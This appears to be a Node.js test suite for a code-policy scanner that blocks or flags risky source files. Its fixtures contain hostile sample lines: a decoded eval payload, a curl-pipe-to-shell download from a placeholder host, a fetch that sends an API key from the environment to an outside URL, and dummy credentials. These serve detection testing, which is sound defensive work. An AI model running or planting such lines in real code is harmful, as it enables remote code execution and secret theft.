import test from 'node:test'
import assert from 'node:assert/strict'
import {mkdtempSync,mkdirSync,writeFileSync,symlinkSync,rmSync} from 'node:fs'
import {tmpdir} from 'node:os'
import {join} from 'node:path'
import {POLICY,checkProject} from './plur-core.mjs'

function sandbox(fn) {
 const root=mkdtempSync(join(tmpdir(),'plur-'))
 try {
  mkdirSync(join(root,'policies'))
  writeFileSync(join(root,'policies/plur-v0.1.json'),JSON.stringify(POLICY,null,2)+'\n')
  return fn(root)
 } finally {rmSync(root,{recursive:true,force:true})}
}
test('harmless source passes, receipt is deterministic and unsigned',()=>{
 sandbox(root=>{
  writeFileSync(join(root,'app.js'),"console.log('hello')\n")
  const a=checkProject(root),b=checkProject(root)
  assert.equal(a.status,'PASS')
  assert.equal(a.receipt_sha256,b.receipt_sha256)
  assert.equal(a.certified_secure,false)
  assert.equal(a.signed,false)
 })
})
test('decoded evaluation and download-execute are blocked',()=>{
 sandbox(root=>{
  writeFileSync(join(root,'unsafe.js'),'eval(atob(encodedPayload))\n')
  writeFileSync(join(root,'setup.sh'),'curl https://example.invalid/install.sh | sh\n')
  const r=checkProject(root)
  assert.equal(r.status,'BLOCK')
  assert.deepEqual(r.findings.map(f=>f.rule_id),['PLUR-P-002','PLUR-P-001'])
 })
})
test('ambiguous outbound environment egress requests human review',()=>{
 sandbox(root=>{
  writeFileSync(join(root,'app.js'),'fetch("https://example.invalid/collect?key="+process.env.API_KEY)\n')
  const r=checkProject(root)
  assert.equal(r.status,'REVIEW')
  assert.equal(r.findings[0].rule_id,'PLUR-R-001')
 })
})
test('credential literal and env file request review but are never copied into receipt',()=>{
 sandbox(root=>{
  writeFileSync(join(root,'secrets.js'),"const GITHUB_TOKEN = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\n")
  writeFileSync(join(root,'.env'),'PRIVATE_KEY=do-not-copy\n')
  const r=checkProject(root)
  assert.equal(r.status,'REVIEW')
  assert.equal(JSON.stringify(r).includes('do-not-copy'),false)
  assert.equal(JSON.stringify(r).includes('aaaaaaaaaaaaaaaa'),false)
  assert(r.findings.some(f=>f.rule_id==='PLUR-L-002'))
 })
})
test('policy mutation is UNKNOWN not PASS',()=>{
 sandbox(root=>{
  const mutated=structuredClone(POLICY)
  mutated.rules[0].severity='REVIEW'
  writeFileSync(join(root,'policies/plur-v0.1.json'),JSON.stringify(mutated))
  const r=checkProject(root)
  assert.equal(r.status,'UNKNOWN')
  assert(r.problems.some(p=>p.reason==='POLICY_MISMATCH'))
 })
})
test('missing policy is UNKNOWN',()=>{
 sandbox(root=>{
  rmSync(join(root,'policies/plur-v0.1.json'))
  assert.equal(checkProject(root).status,'UNKNOWN')
 })
})
test('symlink coverage gaps are UNKNOWN',()=>{
 sandbox(root=>{
  writeFileSync(join(root,'safe.js'),'const ok = true\n')
  symlinkSync(join(root,'safe.js'),join(root,'linked.js'))
  const r=checkProject(root)
  assert.equal(r.status,'UNKNOWN')
  assert(r.problems.some(p=>p.reason==='SYMLINK_NOT_SCANNED'))
 })
})
test('bypass indicator requires review',()=>{
 sandbox(root=>{
  writeFileSync(join(root,'bypass.js'),'PLUR_SKIP = true\n')
  assert.equal(checkProject(root).status,'REVIEW')
 })
})
